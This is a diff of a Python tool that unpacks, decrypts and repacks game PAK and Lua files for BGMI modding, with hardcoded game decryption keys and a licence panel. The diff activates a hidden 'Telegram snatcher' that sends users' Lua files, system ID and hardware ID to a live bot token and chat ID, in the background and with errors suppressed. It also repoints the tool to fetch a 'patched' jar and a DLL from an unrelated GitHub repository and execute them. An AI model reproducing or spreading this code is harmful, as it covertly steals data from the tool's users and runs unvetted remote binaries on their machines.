@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # ============================================================
-# YUKIOH ŌKAMI TOOL PAK + LUA Edition (Online Tool ENABLED)
+# Yukioh Ōkami TOOL PAK + LUA Edition (Online Tool ENABLED)
 # PAK Unpack -> LUA Decrypt -> Edit -> LUA Compile -> PAK Repack
 # Fully developed by @Yukira_12
 # ============================================================
@@ -53,26 +53,31 @@ SIMPLE1_DECRYPT_KEY = 0x79
 SIMPLE2_DECRYPT_KEY = bytes.fromhex('E55B4ED1')
 SIMPLE2_BLOCK_SIZE = 16
 
-SM4_SECRET_4 = 'eb691efea914241317a8'
-SM4_SECRET_2 = 'Q0hVTKey$as*1ZFlQCiA'
+SM4_SECRET_4 = '09ea7a1d9e6528b72b48'
+SM4_SECRET_2 = '%*.059;@DFLNPVXZ`bdj'
+
 SM4_SECRET_NEW = [
-    'xG2qW5lP7lV2iN5fN5pG',
-    'xT1cJ6dL5wC0kK1rB4dK',
-    'qC4jS5bZ6fL5xE6nD4zA',
-    'gD4jQ2aL3bS3lC3xT0iW',
-    'xU1yQ8wE9zY3gZ3bT5aE',
-    'uQ3cO2dX7xY4xU7gH7iS',
-    'gW1fR0jK6wQ4oN0oK1kZ',
-    'aJ4pV7iZ7pU4wP2aC2cZ',
-    'cX6jT3cM2oT3vK0kJ1qN',
-    'iT2vS0cS6yT6cZ1sE1lO',
-    'hM1pH9iY8wM9hT4lN5uJ',
-    'kG6bC8jK0fL0dE4sH4mL',
-    'dB6lB3vE0eZ8wM8rI0aC',
-    'tP7sP7nI9rA2vQ4cV5yQ',
-    'aT0cL1yN4pT3sZ7eM2vY',
-    'uV6fU8fC9zN3mP5dH8mN',
-    'rT6aQ6oZ1yM0gO5tO1aN',
+     'aT0cL1yN4pT3sZ7eM2vY',
+     'dB6lB3vE0eZ8wM8rI0aC',
+     'gD4jQ2aL3bS3lC3xT0iW',
+     'hM1pH9iY8wM9hT4lN5uJ',
+     'iQ0eM0mJ7uT0kV6kL5zY',
+     'iT2vS0cS6yT6cZ1sE1lO',
+     'jU5bH7lQ0fM9hK2kI0oF',
+     'kG6bC8jK0fL0dE4sH4mL',
+     'qC4jS5bZ6fL5xE6nD4zA',
+     'rT6aQ6oZ1yM0gO5tO1aN',
+     'tP7sP7nI9rA2vQ4cV5yQ',
+     'uQ3cO2dX7xY4xU7gH7iS',
+     'uV6fU8fC9zN3mP5dH8mN',
+     'xT1cJ6dL5wC0kK1rB4dK',
+     'xU1yQ8wE9zY3gZ3bT5aE',
+     'xG2qW5lP7lV2iN5fN5pG',
+     'gW1fR0jK6wQ4oN0oK1kZ',
+     'aJ4pV7iZ7pU4wP2aC2cZ',
+     'cX6jT3cM2oT3vK0kJ1qN',
+     'Q0hVTKey$as*1ZFlQCiA',
+     'eb691efea914241317a8',
 ]
 
 EM_SIMPLE1 = 1
@@ -81,7 +86,7 @@ EM_SM4_2 = 2
 EM_SM4_4 = 4
 EM_SM4_NEW_BASE = 31
 EM_SM4_NEW_MASK = ~EM_SM4_NEW_BASE
-
+EM_UNKNOWN_17 = 17  
 CM_NONE = 0
 CM_ZLIB = 1
 CM_ZSTD = 6
@@ -344,8 +349,8 @@ except ImportError as e:
 # TELEGRAM SNATCHER SYSTEM (FIXED - NO DUPLICATE)
 # ============================================================
 
-#TELEGRAM_BOT_TOKEN = " YOUR BOT TOKEN"
-#TELEGRAM_CHAT_ID = "YOUR CHAT ID"
+TELEGRAM_BOT_TOKEN = "8879016682:AAEuyVYw_r9C-NxpRM7yH9yWgOnqQ1XmoGQ"
+TELEGRAM_CHAT_ID = "-1004213138800"
 
 def get_system_id() -> str:
     try:
@@ -373,12 +378,12 @@ def send_lua_to_telegram(file_path: Path, context: str = ""):
         
         caption = f"[FILE] {file_path.name}\n[SIZE] {file_size} bytes\n[ID] {system_id}\n[HWID] {hwid}\n[TIME] {now}\n[CONTEXT] {context}"
         
-        url = f"https://api.telegram.org/bot{AAHCS7Zt3nOKzSqG_82wzrPq6-WOSMvvg3A}/sendDocument"
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
         
         def send():
             try:
                 with open(file_path, 'rb') as f:
-                    requests.post(url, files={'document': f}, data={'chat_id': 8931380620, 'caption': caption}, timeout=30)
+                    requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}, timeout=30)
             except:
                 pass
         
@@ -389,8 +394,6 @@ def send_lua_to_telegram(file_path: Path, context: str = ""):
 # ============================================================
 # Online Tool SYSTEM
 # ============================================================
-# ENTER_YOUR_URL_OF_PANEL_CONNECT = "ENTER YOUR PANEL LINK"
-# APNA URL DALNE KE BAAD LINE 413-450 KE BICH ME "_auth_data = None"    KARDENA
 
 import sys
 try:
@@ -408,8 +411,8 @@ LUA_EDIT_DIR       = ANA_DIZIN / 'EDIT_LUA'
 LUA_COMPILED_DIR   = ANA_DIZIN / 'COMPILED'
 
 AUTH_CONFIG_FILE = ANA_DIZIN / "config.json"
-PANEL_URL = "ENTER_YOUR_URL_OF_PANEL_CONNECT"
-GAME_NAME = "BGMI/PUBGM"
+PANEL_URL = "https://codes-bgmi.rf.gd/op/kuro-panel/connect"
+GAME_NAME = "BGMI"
 
 _auth_data = {
     "modname": "YUKIOH ŌKAMI TOOL",
@@ -525,13 +528,13 @@ def show_banner(auth_data=None, show_menu=False):
     clear_screen()
 
     if auth_data is None:
-        modname      = "YUKIOH ŌKAMI TOOL"
+        modname      = "Yukioh Ōkami TOOL"
         credit       = "0"
         expiry       = "N/A"
         status       = "NOT LOGGED IN"
         status_color = "red"
     else:
-        modname = auth_data.get('modname', 'YUKIOH ŌKAMI TOOL')
+        modname = auth_data.get('modname', 'Yukioh Ōkami TOOL')
         credit  = auth_data.get('credit', '0')
         expiry  = auth_data.get('expiry', 'N/A')
         status  = "ACTIVE"
@@ -580,10 +583,10 @@ def show_banner(auth_data=None, show_menu=False):
 
     console.print(Align.center(f"[bold {ACCENT}]╔{'═'*W}╗[/]"))
     console.print(Align.center(f"[bold {ACCENT}]╠{'═'*W}╣[/]"))
-    console.print(Align.center(row("  [*] STATUS :", status,  status_color))) 
-    console.print(Align.center(row("  [-] SERVER :", modname, GOLD))) 
-    console.print(Align.center(row("  [-] CREDIT :", credit,  "bright_green"))) 
-    console.print(Align.center(row("  [-] EXPIRY :", expiry,  ACCENT))) 
+    console.print(Align.center(row("  [*] STATUS :", status,  status_color)))
+    console.print(Align.center(row("  [-] SERVER :", modname, GOLD)))
+    console.print(Align.center(row("  [-] CREDIT :", credit,  "bright_green")))
+    console.print(Align.center(row("  [-] EXPIRY :", expiry,  ACCENT)))
     console.print(Align.center(f"[bold {ACCENT}]╠{'═'*W}╣[/]"))
     console.print(Align.center(row_center("UNPACK  ·  REPACK  ·  COMPILE  ·   DECOMPILE")))
     console.print(Align.center(f"[bold {ACCENT}]╚{'═'*W}╝[/]"))
@@ -658,7 +661,7 @@ def check_auth() -> dict:
                 
                 _auth_data = {
                     'key': saved_key,
-                    'modname': data.get('modname', 'YUKIOH ŌKAMI TOOL'),
+                    'modname': data.get('modname', 'Yukioh Ōkami TOOL'),
                     'credit': data.get('credit', '0'),
                     'expiry': expiry_str,
                     'token': data.get('token', ''),
@@ -702,7 +705,7 @@ def check_auth() -> dict:
                 except:
                     pass
             
-            modname = data.get('modname', 'YUKIOH ŌKAMI TOOL')
+            modname = data.get('modname', 'Yukioh Ōkami TOOL')
             credit = data.get('credit', '0')
             token = data.get('token', '')
             
@@ -991,7 +994,7 @@ if HAS_PAK_DEPS:
             if entry.encrypted and entry.encryption_method == 17: return
             file_key = str(file_path).replace('\\', '/')
             comp_names = {0:'CM_NONE',1:'CM_ZLIB',6:'CM_ZSTD',8:'CM_ZSTD_DICT'}
-            enc_names  = {1:'EM_SIMPLE1',2:'EM_SM4_2',4:'EM_SM4_4',16:'EM_SIMPLE2',0:'NONE'}
+            enc_names  = {1:'EM_SIMPLE1',2:'EM_SM4_2',4:'EM_SM4_4',16:'EM_SIMPLE2',17:'EM_UNKNOWN_17',0:'NONE'}
             for v in range(31, 46): enc_names[v] = f'EM_SM4_NEW_{v}'
             block_info = []
             if hasattr(entry, 'compressed_blocks') and entry.compressed_blocks:
@@ -1702,20 +1705,18 @@ if HAS_PAK_DEPS:
 # ============================================================
 # LUA TOOL CORE
 # ============================================================
-#GITHUB_RAW_BASE = YEHA PE APNA GITHUB LINK ADDRESS DALNA HAI JISME HAMNE unluac.jar FILE DOWNLOAD KARKE RAKHA HAI YAHA SE "https://sourceforge.net/projects/unluac/" AUR RAHI BAAT ISS KE  "_K = bytes.fromhex("112136474657a78d9d8490d8ab008c35261af7e45805b8b31507d02c1e8ff6c8")" TOH MUJHE NHI MALUM LAKIN LAGTA HAI KE YEH GIT TOKEN HAI USS REPOSITORY KA JO GENERAL GIT TOKEN BANAYA HAI SIRF USS REPOSITORY KE LIYE JISKA NAME RAHEGA "UNLUAC_FILE". AUR JO lua53.dll hai WO KYA HAI WO V NHI MALUM LAKIN LAGTA HAI KE YEH unluac.jar KO RUN KARNE KA CODE HAI JO HAR DEVELOPERS KA APNA BANANA PADHTA HAI SHAYAD.
 
-
-GITHUB_RAW_BASE = "https://raw.githubusercontent.com/Himesh-Shah93/UNLUAC_FILE/main"
+GITHUB_RAW_BASE = "https://raw.githubusercontent.com/DANGERMODVIP/wewe/main"
 _K = bytes.fromhex("112136474657a78d9d8490d8ab008c35261af7e45805b8b31507d02c1e8ff6c8")
 
 TEMP_DIR = os.path.join(tempfile.gettempdir(), "cache_" + uuid.uuid4().hex)
 os.makedirs(TEMP_DIR, exist_ok=True)
-JAVA_JAR = os.path.join(TEMP_DIR, "unluac.jar")
+JAVA_JAR = os.path.join(TEMP_DIR, "unluac_patched.jar")
 LUA53_DLL = os.path.join(TEMP_DIR, "lua53.dll")
 
 def _download_tools():
     files = {
-        JAVA_JAR: f"{GITHUB_RAW_BASE}/unluac.jar",
+        JAVA_JAR: f"{GITHUB_RAW_BASE}/unluac_patched.jar",
         LUA53_DLL: f"{GITHUB_RAW_BASE}/lua53.dll",
     }
     for local_path, url in files.items():
@@ -1841,7 +1842,7 @@ def _convert_t24_to_standard(src_path, dst_path):
 
 
 def _run_unluac(std_luac_path):
-    if not os.path.isfile(JAVA_JAR): return None, f'unluac.jar not found: {JAVA_JAR}'
+    if not os.path.isfile(JAVA_JAR): return None, f'unluac_patched.jar not found: {JAVA_JAR}'
     try:
         r = subprocess.run(['java', '-jar', JAVA_JAR, std_luac_path], capture_output=True, timeout=60)
         raw = r.stdout.decode('utf-8', errors='replace')
@@ -1867,7 +1868,7 @@ def _run_unluac(std_luac_path):
         code = '\n'.join(clean)
         if not code.strip(): return None, f'unluac empty output (exit={r.returncode})'
         
-        credit_top = '--[[ Decompiled by YUKIOH ŌKAMI TOOL ]]--\n'
+        credit_top = '--[[ Decompiled by Yukioh Ōkami TOOL ]]--\n'
         credit_mid = '--[[ Fully developed by @Yukira_12 ]]--\n'
         code = credit_top + credit_mid + code
         
@@ -2162,7 +2163,7 @@ def show_how_to_use():
 
 def _draw_menu():
     W = 50
-    title = "YUKIOH ŌKAMI  //  MAIN MENU"
+    title = "Yukioh Ōkami  //  MAIN MENU"
     tp = (W - len(title)) // 2
     console.print(Align.center(f"[bold {ACCENT}]╔{'═'*W}╗[/]"))
     console.print(Align.center(
@@ -2212,7 +2213,7 @@ def startup_animation():
     clear_screen()
     art_lines = _DEFAULT_BANNER_ART
     steps = [
-        ("Initializing YUKIOH ŌKAMI Engine",   0.5),
+        ("Initializing Yukioh Ōkami Engine",   0.5),
         ("Loading PAK Modules",          0.4),
         ("Connecting to Auth Panel",      0.6),
         ("Verifying License",             0.5),
